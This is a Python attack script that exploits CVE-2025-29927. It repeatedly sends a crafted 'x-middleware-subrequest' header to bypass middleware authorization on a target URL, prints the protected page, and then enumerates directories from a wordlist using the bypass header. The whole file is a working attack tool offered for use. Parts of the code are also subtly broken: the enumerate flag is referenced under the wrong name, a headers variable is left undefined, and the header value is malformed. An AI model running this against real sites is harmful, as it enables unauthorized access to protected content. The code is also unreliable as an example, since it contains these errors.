import argparse
import requests
import sys
import time
from urllib.parse import urljoin
from bs4 import BeautifulSoup
#from render_html import render_in_browser as ren
#from rich.console import Console


def dictionary(file_path: str):
    try:
        with open(file_path, 'r') as file:
            return file.readlines()
    except Exception as e:
        error_msg = f"ERROR: failed opening dictionary at path {file_path} with error: {e}"
        return None, error_msg


def dirnum(file_path: str, url: str, mute: list, exploit_header: str, delay: int, timeout=10):
    try:
        dirdict = {}
        dict_result = dictionary(file_path)
        if dict_result is None or (isinstance(dict_result, tuple) and dict_result[0] is None):
            if isinstance(dict_result, tuple):
                return dict_result[1]
            return "ERROR: Failed to read dictionary file"

        header = {}
        if exploit_header:
            if ":" in exploit_header:
                header_parts = exploit_header.split(":", 1)
                headers = {header_parts[0].strip(): header_parts[1].strip()}
        
        for line in dict_result:
            test_url = urljoin(url.rstrip('/') + '/', line.strip())
            try:
                response = requests.get(test_url, headers=headers, timeout=timeout, allow_redirects=False)
                if response.status_code in mute:
                    continue
                else:
                    print(f"{test_url} STATUS CODE: {response.status_code}\n")
                    dirdict[test_url] = [response.status_code]
                    time.sleep(delay)
            except requests.exceptions.RequestException as e:
                error_msg = f"ERROR: failed sending request to {test_url} with error: {e}"
                print(error_msg)
                continue
        return dirdict
    except Exception as e:
        error_msg = f"ERROR: failed enumeration with error {e}"
        return error_msg


def buitify_html(text: str):
    soup = BeautifulSoup(text, "html.parser")
    return soup.prettify()


def requestr(url: str, header_name="x-middleware-subrequest", header_value="middleware", timeout=10):
    '''
    agent_headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    }
    '''
    exploit_header=header_name + ": " + header_value

    try:
        response = requests.get(url, timeout=timeout, allow_redirects=False)
        if response.status_code == 200:
            return "URL is accessible"
        else:
            for attempt in range(8): 
                headers = {header_name: exploit_header}
                
                try:
                    response = requests.get(url, headers=headers, timeout=timeout, allow_redirects=False)
                    
                    if response.status_code == 200:
                        msg = f"Successfully exploited CVE-2025-29927 on {url} with header value: {exploit_header}! Status code: {response.status_code} (attempt {attempt + 1})"
                        #returns True for identification, optional msg, a response HTML for exploring and the exploit header for futher actions.
                        return True,response.text,msg,exploit_header
                    else:
                        if attempt < 7:
                            exploit_header = f"{exploit_header}:{header_value}"
                        else:
                            return None
                
                except requests.exceptions.RequestException as e:
                    error_msg=f"Request error on attempt {attempt + 1}: {e}"
                    if attempt < 7:
                        exploit_header = f"{exploit_header}:{header_value}"
                    else:
                        return error_msg
                        
    except requests.exceptions.RequestException as e:
        print(f"Error: {e}")
        return None
    
    print("All attempts failed. Returning None.")
    return None


def main():
    parser = argparse.ArgumentParser(
        description='This script is used for exploitation or enumeration related to CVE-2025-29927.'
    )
    parser.add_argument('-d', '--dictionary', help='Path to dictionary wordlist (required for -EN or -F).')
    parser.add_argument('-u', '--url', help='Target URL.', required=True)
    parser.add_argument('-F', '--full-run', action='store_true', help='Run exploitation and enumeration together.')
    parser.add_argument('-EN', '--enum', action='store_true', help='Enumerate without exploiting.')
    parser.add_argument('-EX', '--exploit', action='store_true', help='Only test exploitation on URL and show output HTML.')
    parser.add_argument(
        '-m',
        '--mute-codes',
        nargs='+',
        help='Response codes to mute (comma and/or space separated, e.g. -m 301,302 404).'
    )

    args = parser.parse_args()

    def parse_status_codes(values):
        codes = []
        if not values:
            return codes
        for token in values:
            for part in token.split(','):
                part = part.strip()
                if not part:
                    continue
                if part.isdigit():
                    codes.append(int(part))
                else:
                    parser.error(f"Invalid status code '{part}'. Codes must be integers.")
        return codes

    mute_codes = parse_status_codes(args.mute_codes)
    dictionary_file = args.dictionary
    run_full = args.full_run
    enumerate_mode = args.enumerate
    exploit_mode = args.exploit or (not enumerate_mode and not run_full)
    url = args.url

    if (enumerate_mode or run_full) and not dictionary_file:
        parser.error("-d/--dictionary is required when using -EN/--enumerate or -F/--full-run.")

    print(f"Target URL: {url}")

    if run_full:
        print("Running full mode (exploitation + enumeration)...\n")
        exploit_result = requestr(url)
        exploit_header = ""
        if exploit_result and isinstance(exploit_result, tuple) and exploit_result[0] is True:
            print(exploit_result[2])
            print(buitify_html(exploit_result[1]))
            exploit_header = exploit_result[3]
        elif exploit_result == "URL is accessible":
            print("URL is accessible, continuing with enumeration.")
        else:
            print("\nExploitation portion failed; continuing with enumeration using default headers.")
        enum = dirnum(dictionary_file, url, mute=mute_codes, exploit_header=exploit_header, delay=1)
        if isinstance(enum, dict):
            if enum:
                print(f"\nFound {len(enum)} accessible paths:")
                for path, codes in enum.items():
                    print(f"  {path} - Status: {codes[0]}")
            else:
                print("\nNo accessible paths found.")
        else:
            print(enum)
        return

    if enumerate_mode:
        print("Starting directory enumeration...\n")
        enum = dirnum(dictionary_file, url, mute=mute_codes, exploit_header="", delay=1)
        if isinstance(enum, dict):
            if enum:
                print(f"\nFound {len(enum)} accessible paths:")
                for path, codes in enum.items():
                    print(f"  {path} - Status: {codes[0]}")
            else:
                print("\nNo accessible paths found.")
        else:
            print(enum)

    if exploit_mode:
        print("Starting CVE-2025-29927 exploitation attempt...\n")
        result = requestr(url)
        
        if result == "URL is accessible":
            print("URL is accessible")
        elif result and isinstance(result, tuple) and result[0] == True:
            print(result[2])
            print(buitify_html(result[1]))
            #ren(result)
        else:
            print("\nExploitation failed.")


if __name__ == "__main__":
    main()
